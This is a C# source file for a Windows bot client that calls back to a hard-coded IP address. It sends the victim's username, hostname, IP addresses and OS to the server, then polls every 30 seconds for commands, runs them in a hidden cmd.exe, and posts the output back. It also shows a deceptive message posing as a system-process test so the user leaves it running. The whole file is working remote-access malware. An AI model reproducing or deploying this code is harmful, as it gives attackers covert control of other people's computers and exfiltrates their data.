using System;  
using System.IO;  
using System.Net;
using System.Text;  
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

// mcs <file> -out:<compiled.exe>
 
namespace My.WebBot
{
    class myWebBot
    {
	private static string registerBot(string dstIP, string rURI)
	{
		string requestURL = "http://" + dstIP + rURI;
		//string botNumb = random.Next(999999).ToString();
		Random random = new Random();
		string chars = "0123456789abcdefghijklmnopqrstuvwxyz";
		StringBuilder botName = new StringBuilder(12);
		for (int i = 0; i < 12; i++)
		{
			botName.Append(chars[random.Next(chars.Length)]);
		}
		string compIdentity = WindowsIdentity.GetCurrent().Name.ToString();
		string hostName = Dns.GetHostName();
		string os = Environment.OSVersion.ToString();
		string ipAddresses = "";
		IPAddress[] ipaddress = Dns.GetHostAddresses(hostName);
		foreach(IPAddress ip in ipaddress)
		{
			ipAddresses = ipAddresses + ip.ToString() + "|";
		}
		WebRequest regRequest = WebRequest.Create(requestURL);
		regRequest.Method = "POST";
		string postData = "user=" + compIdentity;
		postData = postData + "&hostName=" + hostName;
		postData = postData + "&ipList=" + ipAddresses; 
		postData = postData + "&os=" + os;
		postData = postData + "&botName=" + botName.ToString();
		byte[] postBytes = Encoding.UTF8.GetBytes(postData);
		string b64postBytes = Convert.ToBase64String(postBytes);
		byte[] b64Bytes = Encoding.UTF8.GetBytes(b64postBytes);
		regRequest.ContentType = "text/plain";
		regRequest.ContentLength = b64Bytes.Length;
		// User-Agent is a protected field...
		//regRequest.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36";
		Stream requestStream = regRequest.GetRequestStream();
                requestStream.Write(b64Bytes, 0, b64Bytes.Length);
                requestStream.Close();
		//WebResponse regResponse = regRequest.GetResponse();
		//Console.WriteLine(regResponse);
		return botName.ToString();
	}

	private static string getCommand(string dstIP, string gURI, string bName)
	{
		string requestURL = "http://" + dstIP + gURI + "?botName=" + bName;
            	WebRequest request = WebRequest.Create(requestURL);  
            	WebResponse response = request.GetResponse();  
            	//Console.WriteLine (((HttpWebResponse)response).StatusDescription);  
            	Stream dataStream = response.GetResponseStream();  
            	StreamReader reader = new StreamReader(dataStream);  
            	string responseFromServer = reader.ReadToEnd();  
		// https://stackoverflow.com/questions/1469764/run-command-prompt-commands
	    	//string cmdText = "/C ping -n 1 127.0.0.1";
	    	//Process.Start("cmd.exe", cmdText);
		if (responseFromServer.Length > 0)
		{
			string[] responseFS = responseFromServer.Split('|');
			string responseCommandID = responseFS[0];
			string responseCommand = responseFS[1];
			responseCommand = responseCommand.Replace("%20"," ");
	    		Process p = new Process();
		    	p.StartInfo.UseShellExecute = false;
		    	p.StartInfo.RedirectStandardOutput = true;
			p.StartInfo.RedirectStandardError = true;
			p.StartInfo.CreateNoWindow = true;
			p.StartInfo.FileName="cmd.exe";
			//p.StartInfo.Arguments = "/C ping -n 1 127.0.0.1";
			p.StartInfo.Arguments = "/C " + responseCommand;
			p.Start();
			string output = p.StandardOutput.ReadToEnd();
			p.WaitForExit();
			byte[] bytesOutput = Encoding.UTF8.GetBytes(output);
			string b64output = Convert.ToBase64String(bytesOutput);
			string postOutput = "command='" + responseFromServer + "'&";
			postOutput = postOutput + "commandid='" + responseCommandID + "'&";
			postOutput = postOutput + "botName='" + bName + "'&";
			postOutput = postOutput + "resultsCommand='" + b64output + "'";
			Console.WriteLine(postOutput);
        	    	reader.Close();  
			response.Close();  
			return postOutput;
		}
		return "Nothing";
	}

	private static void postResults(string dstIP, string pURI, string bName, string rOutput)
	{
		string requestURL = "http://" + dstIP + pURI;
		WebRequest regRequest = WebRequest.Create(requestURL);
		regRequest.Method = "POST";
		string postData = rOutput;
		Console.WriteLine(rOutput);
		byte[] postBytes = Encoding.UTF8.GetBytes(postData);
		regRequest.ContentType = "text/plain";
		regRequest.ContentLength = postBytes.Length;
		Stream requestStream = regRequest.GetRequestStream();
                requestStream.Write(postBytes, 0, postBytes.Length);
                requestStream.Close();
		//WebResponse regResponse = regRequest.GetResponse();
		//Console.WriteLine(regResponse);
	}


        private static void Main()  
        { 
		string destinationIP = "45.62.232.167";
	   	string registerURI = "/register";
		string getURI = "/get";
		string postURI = "/post";
	   	string botNickName = registerBot(destinationIP, registerURI);
		string resultOutput = "";
		Console.WriteLine("Sorry for the inconvienence! Please minimize this windows until we complete our testing of the 'Client Server Runtime Process'.");
		while (true) 
		{
	   		resultOutput = getCommand(destinationIP, getURI, botNickName);
			if (resultOutput == "Nothing")
			{
				Thread.Sleep(30000);
			}
			else {
				postResults(destinationIP, postURI, botNickName, resultOutput);
				Thread.Sleep(30000);  // 30 Seconds
			}
		}
        }  
   }
}
